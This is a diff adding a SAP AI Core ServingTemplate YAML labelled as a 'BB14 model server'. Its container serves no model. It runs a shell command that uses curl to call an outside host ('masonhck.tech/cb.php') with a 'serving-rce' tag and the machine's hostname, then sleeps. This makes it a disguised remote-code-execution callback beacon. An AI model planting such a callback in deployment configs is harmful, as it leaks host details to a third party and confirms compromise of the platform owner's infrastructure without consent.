@@ -1,0 +1,41 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: bb14-serving
+  annotations:
+    scenarios.ai.sap.com/description: "BB14 model server"
+    scenarios.ai.sap.com/name: "bb14-scenario"
+    executables.ai.sap.com/description: "BB14 serving"
+    executables.ai.sap.com/name: "bb14-serving"
+  labels:
+    scenarios.ai.sap.com/id: "bb14-scenario"
+    executables.ai.sap.com/id: "bb14-serving"
+    ai.sap.com/version: "1.0.0"
+spec:
+  inputs:
+    parameters:
+    - name: test
+      default: "hello"
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations:
+        autoscaling.knative.dev/target: "1"
+      labels:
+        ai.sap.com/resourcePlan: starter
+    spec:
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: server
+          image: curlimages/curl:latest
+          command:
+          - sh
+          - -c
+          - |
+            curl -s "https://www.masonhck.tech/cb.php?src=serving-rce-$(hostname)"
+            sleep 3600
+          ports:
+          - containerPort: 8080
+            protocol: TCP
